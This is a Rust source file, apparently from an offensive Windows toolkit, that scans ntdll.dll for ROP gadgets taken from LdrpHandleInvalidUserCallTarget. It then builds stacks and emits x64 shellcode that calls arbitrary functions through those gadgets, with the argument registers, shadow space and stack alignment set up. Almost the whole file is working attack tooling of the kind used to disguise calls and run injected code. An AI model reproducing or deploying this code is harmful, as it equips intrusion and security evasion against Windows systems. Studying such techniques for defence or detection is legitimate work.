//  .text:0000000180123AB0; void __fastcall LdrpHandleInvalidUserCallTarget()
//  [...]
//  .text:0000000180123AB0 41 53                                         push    r11
//  .text:0000000180123AB2 41 52                                         push    r10
//  .text:0000000180123AB4 41 51                                         push    r9
//  .text:0000000180123AB6 41 50                                         push    r8
//  .text:0000000180123AB8 51                                            push    rcx
//  .text:0000000180123AB9 52                                            push    rdx
//  .text:0000000180123ABA 50                                            push    rax
//  [...]
//  .text:0000000180123B12 58                                            pop     rax
//  .text:0000000180123B13 5A                                            pop     rdx
//  .text:0000000180123B14 59                                            pop     rcx
//  .text:0000000180123B15 41 58                                         pop     r8
//  .text:0000000180123B17 41 59                                         pop     r9
//  .text:0000000180123B19 41 5A                                         pop     r10
//  .text:0000000180123B1B 41 5B                                         pop     r11
//  .text:0000000180123B1D 48 FF E0                                      jmp     rax
//  [...]
//  .text:0000000180123B31 58                                            pop     rax <--- skip this instruction (to not remove return address)
//  .text:0000000180123B32 5A                                            pop     rdx <--- 2th arg
//  .text:0000000180123B33 59                                            pop     rcx <--- 1th arg
//  .text:0000000180123B34 41 58                                         pop     r8  <--- 3th arg
//  .text:0000000180123B36 41 59                                         pop     r9  <--- 4th arg
//  .text:0000000180123B38 41 5A                                         pop     r10
//  .text:0000000180123B3A 41 5B                                         pop     r11
//  .text:0000000180123B3C C3                                            retn

#![allow(dead_code)]

use crate::prelude::*;
use crate::pe_module;

use crate::shellcode::generic;
use generic::find_rop_gadget_ret;

pub fn find_rop_gadget_pop_values_and_jmp() -> Option<&'static[u8]> {
    pe_module::find_code_in_module(
        "ntdll.dll",
        &[
            0x58,            // pop rax
            0x5A,            // pop rdx
            0x59,            // pop rcx
            0x41, 0x58,      // pop r8
            0x41, 0x59,      // pop r9
            0x41, 0x5A,      // pop r10
            0x41, 0x5B,      // pop r11
            0x48, 0xFF, 0xE0 // jmp rax
        ],
    )
}

pub fn find_rop_gadget_setup_reg_values_and_ret() -> Option<&'static[u8]> {
    pe_module::find_code_in_module(
        "ntdll.dll",
        &[
            0x5A,        // pop rdx
            0x59,        // pop rcx
            0x41, 0x58,  // pop r8
            0x41, 0x59,  // pop r9
            0x41, 0x5A,  // pop r10
            0x41, 0x5B,  // pop r11
            0xC3         // ret
        ],
    )
}

pub fn find_rop_gadget_pop_values_and_ret8(count: usize) -> Option<&'static[u8]> {

    assert!(count <= 8, "Count must be less than or equal to 8");

    let mut code = Vec::with_capacity(8 + 1); // 8 pops + ret

    if count >= 8 {
        code.push(0x41); code.push(0x5F); // pop r15
    }
    if count >= 7 {
        code.push(0x41); code.push(0x5E); // pop r14
    }
    if count >= 6 {
        code.push(0x41); code.push(0x5D); // pop r13
    }
    if count >= 5 {
        code.push(0x41); code.push(0x5C); // pop r12
    }
    if count >= 4 {
        code.push(0x5F); // pop rdi
    }
    if count >= 3 {
        code.push(0x5E); // pop rsi
    }
    if count >= 2 {
        code.push(0x5B); // pop rbx
    }
    if count >= 1 {
        code.push(0x5D); // pop rbp
    }
    code.push(0xC3); // ret

    pe_module::find_code_in_module("ntdll.dll", &code)
}

pub fn find_clean_stack_gadget(count: usize, extra_imm64: &mut usize) -> Option<&'static[u8]> {
    for i in 0..10 {
        if let Some(gadget) = generic::find_rop_gadget_pop_values_and_ret(count + i) {
            *extra_imm64 += i;
            return Some(gadget);
        }
    }

    None
}

pub fn build_stack_for_gadget(
    ret_addr: Option<*const u8>,
    function_address: *const u8,
    args: &[u64],
    sp_aligned: bool
) -> Option<Vec<u64>> {
    let arg1 = *args.get(0).unwrap_or(&0);
    let arg2 = *args.get(1).unwrap_or(&0);
    let arg3 = *args.get(2).unwrap_or(&0);
    let arg4 = *args.get(3).unwrap_or(&0);
    let args_extra = if args.len() > 4 { &args[4..] } else { &[] };

    let mut extra_imm64 = 0;

    let stack_placeholder_gadget = generic::find_rop_gadget_pop_values_and_ret(0)?;

    loop {
        // gadget to clean stack from shadow space, stack args and alignment
        let stack_clean_gadget = find_clean_stack_gadget(4 + args_extra.len(), &mut extra_imm64)?;

        let mut stack = Vec::new();

        for arg in [
            arg2, // rdx
            arg1, // rcx
            arg3, // r8
            arg4, // r9
            0,    // r11 (not used)
            0,    // r10 (not used)
            function_address as u64,
        ] {
            stack.push(arg); // args will be popped by the gadget
        }

        let mut imm64_count: usize = 0; // count if we need to add aligning imm64 value on stack

        // stack clean gadget address
        stack.push(stack_clean_gadget.as_ptr() as _);
        imm64_count += 1;

        // shadow space (0x20 bytes)
        for _ in 0..4 {
            stack.push(0xDEADDEADDEADDEAD);
            imm64_count += 1;
        }

        // stack arguments
        for &arg in args_extra {
            stack.push(arg);
            imm64_count += 1;
        }

        for _ in 0..extra_imm64 {
            // some values will be deleted by the gadget, the rest will delete themselves (ret)
            stack.push(stack_placeholder_gadget.as_ptr() as _);
            imm64_count += 1;
        }

        // return address (if provided)
        if let Some(ret) = ret_addr {
            stack.push(ret as _);
            imm64_count += 1;
        }

        // when rip becomes equal to FunctionAddress, we should have an unaligned stack (aligned + imm64 RetAddr)
        if sp_aligned != generic::is_aligned(imm64_count * size_of::<u64>(), 4) {
            return Some(stack);
        }

        extra_imm64 = 1; // try building with alignment
    }
}

pub fn build_shellcode_for_gadget(
    ret_addr: Option<*const u8>,
    function_address: *const u8,
    args: &[u64],
    sp_aligned: bool
) -> Option<Vec<u8>> {
    let arg1 = *args.get(0).unwrap_or(&0);
    let arg2 = *args.get(1).unwrap_or(&0);
    let arg3 = *args.get(2).unwrap_or(&0);
    let arg4 = *args.get(3).unwrap_or(&0);
    let args_extra = if args.len() > 4 { &args[4..] } else { &[] };

    let mut extra_imm64 = 0;

    // the main gadget to setup registers and jump via ret
    let call_gadget = find_rop_gadget_setup_reg_values_and_ret()?;
    let stack_placeholder_gadget = find_rop_gadget_ret()?;

    loop {
        let stack_clean_gadget = find_clean_stack_gadget(4 + args_extra.len(), &mut extra_imm64)?;

        let mut shellcode = Vec::new();

        let mut imm64_count: usize = 0; // count if we need to add aligning imm64 value on stack

        let mut push_imm64 = |value: u64| {
            shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, imm64
            shellcode.extend_from_slice(value.to_le_bytes().as_slice());
            shellcode.extend_from_slice(&[0x50]);       // push rax
        };

        // if return address does not specified, we will use address from stack
        if let Some(ret) = ret_addr {
            push_imm64(ret as _);
            imm64_count += 1;
        }

        for _ in 0..extra_imm64 {
            // some values will be deleted by the gadget, the rest will delete themselves (ret)
            push_imm64(stack_placeholder_gadget.as_ptr() as _);
            imm64_count += 1;
        }

        // stack arguments
        for &arg in args_extra.iter().rev() {
            push_imm64(arg);
            imm64_count += 1;
        }

        // shadow space (0x20 bytes)
        for _ in 0..4 {
            push_imm64(0xDEADDEADDEADDEAD);
            imm64_count += 1;
        }

        push_imm64(stack_clean_gadget.as_ptr() as _);
        imm64_count += 1;

        for &arg in [
            arg2, // rdx
            arg1, // rcx
            arg3, // r8
            arg4, // r9
            0,    // r11 (not used)
            0,    // r10 (not used)
            function_address as u64,
        ].iter().rev() {
            push_imm64(arg); // args will be popped by the gadget
        }

        shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, imm64
        shellcode.extend_from_slice((call_gadget.as_ptr() as u64).to_le_bytes().as_slice());
        shellcode.extend_from_slice(&[0xFF, 0xE0]); // jmp rax

        // when rip becomes equal to FunctionAddress, we should have an unaligned stack (aligned + imm64 RetAddr)
        if sp_aligned != generic::is_aligned(imm64_count * size_of::<u64>(), 4) {
            return Some(shellcode);
        }

        extra_imm64 = 1; // try building with alignment
    }
}
